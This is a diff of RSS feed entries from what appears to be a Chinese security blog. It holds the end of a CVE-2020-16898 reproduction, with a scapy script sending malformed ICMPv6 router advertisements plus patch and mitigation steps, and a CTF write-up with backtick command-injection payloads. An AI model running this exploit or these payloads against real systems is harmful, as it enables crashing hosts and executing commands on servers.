+&lt;span class=&#34;n&#34;&gt;p_test&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p_test_half&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ICMPv6NDOptEFA&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ICMPv6NDOptRDNSS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;len&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;21&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dns&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;AAAA:AAAA:AAAA:AAAA:FFFF:AAAA:AAAA:AAAA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ICMPv6ND_RA&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ICMPv6NDOptRDNSS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; \
+      &lt;span class=&#34;n&#34;&gt;Raw&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;load&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p_test_half&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x18\xa0&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;p_test_frag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IPv6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dst&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v6_dst&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v6_src&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hlim&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;255&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; \
+              &lt;span class=&#34;n&#34;&gt;IPv6ExtHdrFragment&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fragment6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p_test_frag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;配置好后执行exp即可。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 CVE-2020-16898.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758979287.png&#34;
+	width=&#34;1194&#34;
+	height=&#34;920&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758979287_hu4bcd3bd88d4ad3c22014a44bd68492e2_57381_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1614758979287_hu4bcd3bd88d4ad3c22014a44bd68492e2_57381_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1614758979287&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;129&#34;
+		data-flex-basis=&#34;311px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;修复方式&#34;&gt;修复方式&lt;/h2&gt;
+&lt;p&gt;1.升级windows版本，下载对应补丁包进行修复。&lt;/p&gt;
+&lt;p&gt;​		下载链接：&lt;a class=&#34;link&#34; href=&#34;https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;2.禁用基于RA的DNS配置CMPv6 RDNSS&lt;/p&gt;
+&lt;p&gt;​		使用以下PowerShell命令禁用ICMPv6 RDNSS，以防止攻击者利用此漏洞。此解决方法仅适用于Windows 1709及更高版本。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;netsh int ipv6 &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; int *INTERFACENUMBER* &lt;span class=&#34;nv&#34;&gt;rabaseddnsconfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;disable
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.secpulse.com/archives/145622.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.secpulse.com/archives/145622.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/forforever/p/13846077.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.cnblogs.com/forforever/p/13846077.html&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>CTFShow web入门396-402wp</title>
+        <link>https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8396-402wp/</link>
+        <pubDate>Sun, 07 Feb 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8396-402wp/</guid>
+        <description>&lt;p&gt;题目描述：特定函数绕过。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8396-402wp/1612683272098.png&#34;
+	width=&#34;820&#34;
+	height=&#34;695&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8396-402wp/1612683272098_huc077a52c9b6bfa0b42ade1efb202348d_65296_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8396-402wp/1612683272098_huc077a52c9b6bfa0b42ade1efb202348d_65296_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1612683272098&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;117&#34;
+		data-flex-basis=&#34;283px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;根据描述来看我们需要绕过一些函数，这里有两个重要函数，一个是&lt;a class=&#34;link&#34; href=&#34;https://www.php.net/parse_url&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;parse_url&lt;/a&gt;，一个是shell_exec。第二个大家应该都很熟悉，这里说一下第一个。&lt;/p&gt;
+&lt;p&gt;该函数是用来解析url的，一个完整的url会包括好多部分，以下是示例。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;
+&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;$url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://username:password@hostname/path?arg=value#anchor&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;nx&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;parse_url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
+&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt; 
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;输出：
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;    Array
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;(
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;    [scheme] =&amp;gt; http
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;    [host] =&amp;gt; hostname
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;    [user] =&amp;gt; username
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;    [pass] =&amp;gt; password
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;    [path] =&amp;gt; /path
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;    [query] =&amp;gt; arg=value
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;    [fragment] =&amp;gt; anchor
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;)
+&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;好我们返回来看题，题目代码解析url之后使用了其host和path两部分。我们可以直接修改上面代码中的示例url的对应部分，这里大家可以自己用php实际测试一下。&lt;/p&gt;
+&lt;p&gt;以下是我本人的做题思路，想要payload的同学可以直接跳到后面。&lt;/p&gt;
+&lt;h2 id=&#34;我的思路&#34;&gt;我的思路：&lt;/h2&gt;
+&lt;p&gt;最开始我的着重点不在于给出的shell_exec这个函数中的格式，也就是“echo”那一串，而是把目光放在了parse_url上，我发现可以在path这个地方进行任意命令执行，大家可以用下面的代码实测一下，我将其命名为test.php&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;error_reporting&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;url&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])){&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;parse_url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;url&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;shell_exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;echo &amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;host&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;gt; &amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;path&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;我们可以尝试构造url=http://username:password@hostname//|ls&lt;/p&gt;
+&lt;p&gt;大家可以发现我将path替换成了 //|ls ，可以看到我多加了一个斜杠，这里涉及到parse_url函数的绕过，这样做会使函数解析失效，请大家自行百度，不做过多讲解。然后通过管道符拼接我们想要的命令就可以实现任意命令执行。&lt;/p&gt;
+&lt;p&gt;但是有个很严重的问题是shell_exec这个函数没有回显，虽然我们自己本地测试可以用变量承载它的输出，但是这道题不行，我当时在这里卡了好久，一直想通过一些文件操作命令写入或者编辑，但是我们权限不够，或者说这个页面的php文件权限不够，大家可以试着将本地的test.php文件提升权限，当权限足够高的时候就可以随意操作文件了。&lt;/p&gt;
+&lt;p&gt;这条路终究是走不通的，也可能是我没想到，如果有人有更好的解题办法请联系我！&lt;img src=&#34;https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8396-402wp/1612684468478.png&#34;
+	width=&#34;795&#34;
+	height=&#34;492&#34;
+	srcset=&#34;https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8396-402wp/1612684468478_hu1e4f0f5ea731fac505dda770e09cb886_400974_480x0_resize_box_2.png 480w, https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8396-402wp/1612684468478_hu1e4f0f5ea731fac505dda770e09cb886_400974_1024x0_resize_box_2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;1612684468478&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;161&#34;
+		data-flex-basis=&#34;387px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;那只能转向shell_exec了，可以看到，它已经给了一串字符了，再一看它是规定好了要使用echo这个命令，后面还有个&amp;gt;符号，百度一查发现是echo的重定向功能，这么一看，这道题的实际意思其实是让我们将url中的【host】部分重定向到【path】中。在linux命令行中使用这个命令，例如 echo flag.php &amp;gt; a.txt ，这样的话如果有a.txt则将&amp;quot;flag.php&amp;quot;这个字符串覆盖到a.txt中，若是没有a.txt的话则新建一个然后覆盖写入。&lt;/p&gt;
+&lt;p&gt;本题没说flag在哪个文件里。所以我们要先执行ls。&lt;/p&gt;
+&lt;p&gt;那咋即执行命令，又把命令的输出写入文件呢？&lt;/p&gt;
+&lt;h2 id=&#34;payload&#34;&gt;payload：&lt;/h2&gt;
+&lt;p&gt;这里我们构造payload：?url=http://username:password@`ls`/var/www/html/a.txt&lt;/p&gt;
+&lt;p&gt;答案是反引号，反引号也会执行命令，然后echo将ls的输出写入到a.txt中，之后直接访问a.txt会发现有个fl0g.php的文件&lt;/p&gt;
+&lt;p&gt;然后再次构造：?url=http://username:password@`cat fl0g.php`/var/www/html/a.txt&lt;/p&gt;
+&lt;p&gt;访问a.txt获得flag。&lt;/p&gt;
